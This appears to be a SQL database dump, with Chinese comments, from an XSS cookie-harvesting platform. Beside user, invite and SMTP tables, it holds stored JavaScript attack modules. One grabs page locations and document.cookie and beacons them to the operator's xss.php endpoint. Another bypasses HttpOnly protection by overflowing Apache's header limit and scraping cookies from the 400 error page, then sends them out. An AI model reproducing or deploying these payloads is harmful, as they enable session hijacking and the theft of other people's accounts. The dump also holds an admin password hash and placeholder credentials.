...
CREATE TABLE IF NOT EXISTS `oc_allfilter` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `filterurl` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=7 ;

--
-- 转存表中的数据 `oc_allfilter`
--

INSERT INTO `oc_allfilter` (`id`, `filterurl`) VALUES
(6, 'gov.cn'),
(5, 'edu.cn');
...
CREATE TABLE IF NOT EXISTS `oc_email` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ehost` varchar(100) DEFAULT NULL,
  `euser` varchar(255) DEFAULT NULL,
  `epass` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
...
INSERT INTO `oc_email` (`id`, `ehost`, `euser`, `epass`) VALUES
(1, 'smtp.test.com', 'long411161555@test.com', 'testtesttest');
...
--
-- 转存表中的数据 `oc_invite_reg`
--

INSERT INTO `oc_invite_reg` (`id`, `userId`, `inviteKey`, `isUsed`, `regUserId`, `regTime`, `addTime`, `isWooyun`) VALUES
(1, 1, '0dd437708c1701aa90a3e1637bf76547', 0, 0, 1387955306, 1384917135, 0);
...
CREATE TABLE IF NOT EXISTS `oc_ipurlblack` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userId` int(11) DEFAULT '0',
...
(1, 1, '默认模块', '["location","toplocation","cookie","opener"]', '["keepsession"]', '(function(){(new Image()).src=&#039;http://替换成你的域名/xss.php?do=api&amp;id={projectId}&amp;location=&#039;+escape((function(){try{return document.location.href}catch(e){return &#039;&#039;}})())+&#039;&amp;toplocation=&#039;+escape((function(){try{return top.location.href}catch(e){return &#039;&#039;}})())+&#039;&amp;cookie=&#039;+escape((function(){try{return document.cookie}catch(e){return &#039;&#039;}})())+&#039;&amp;opener=&#039;+escape((function(){try{return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#039;&#039;}catch(e){return &#039;&#039;}})());})();\r\nif(&#039;{set.keepsession}&#039;==1){keep=new Image();keep.src=&#039;http://替换成你的域名/xss.php?do=keepsession&amp;id={projectId}&amp;url=&#039;+escape(document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie)};\r\n', 0, 1, '通过xss完成基本的攻击，包括获取后台地址，认证cookie', 1, 1, 'blue', 1341846542),
(4, 1, 'apache httponly bypass', '["location","toplocation","cookie","opener"]', NULL, 'function setCookies () {\r\n    /*apache server limit 8192*/\r\n    var str = &quot;&quot;;\r\n    for (var i=0; i&lt; 819; i++) {\r\n        str += &quot;x&quot;;\r\n    }\r\n    for (i = 0; i &lt; 10; i++) {\r\n            var cookie = &quot;ray&quot;+i+&quot;=&quot;+str+&quot;;path=/&quot;;\r\n            document.cookie = cookie;\r\n        }\r\n}\r\n\r\nfunction parseCookies () {\r\n    if (xhr.readyState === 4 &amp;&amp; xhr.status === 400) {\r\n            var content = xhr.responseText.replace(/\\r|\\n/g,&#039;&#039;).match(/&lt;pre&gt;(.+)&lt;\\/pre&gt;/);\r\n            content = content[1].replace(&quot;Cookie: &quot;, &quot;&quot;);\r\n            cookies = content.replace(/ray\\d=x+;?/g, &#039;&#039;)\r\n            try { \r\n              var myopener=&#039;&#039;; myopener = window.parent.openner.location;\r\n              var myparent = &#039;&#039;; myparent = window.parent.location;\r\n            } catch(err){\r\n              myopener=&#039;0&#039;;myparent =&#039;0&#039;;\r\n            }\r\n            window.location=&#039;http://替换成你的域名/xss.php?do=api&amp;id={projectId}&amp;location=&#039;+escape(document.location)+&#039;&amp;toplocation=&#039;+escape(myparent)+&#039;&amp;cookie=&#039;+escape(cookies)+&#039;&amp;opener=&#039;+escape(myopener);\r\n    }\r\n}\r\n\r\nsetCookies();\r\nvar xhr = window.XMLHttpRequest? new XMLHttpRequest() : window.ActiveXObject ? new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;) : new XMLHttpRequest();\r\nxhr.onreadystatechange = parseCookies;\r\nxhr.open(&quot;POST&quot;, &quot;/?&quot;+Math.random(), true);\r\nxhr.send(null);', 0, 1, '利用apache server head limit 8192字节限制, 从400状态页爆出httponly保护的cookie.', 1, 1, 'admin', 1342155756),
...
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=33179 ;
...
INSERT INTO `oc_user` (`id`, `adminLevel`, `userName`, `userPwd`, `email`, `phone`, `message`, `validated`, `validateKey`, `sex`, `avatarImg`, `avatarImg_b`, `avatarImg_s`, `signature`, `creditPoint`, `rankPoint`, `description`, `status`, `contentNum`, `attentNum`, `hotNum`, `loginTime`, `addTime`) VALUES
(1, 1, 'admin', '16008ce5fc8a8c9db9d21651574b403e', 'test@qq.com', '133333333333', '0|0', 0, NULL, 0, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, 0, 0, 0, 1474855217, 1384589755);
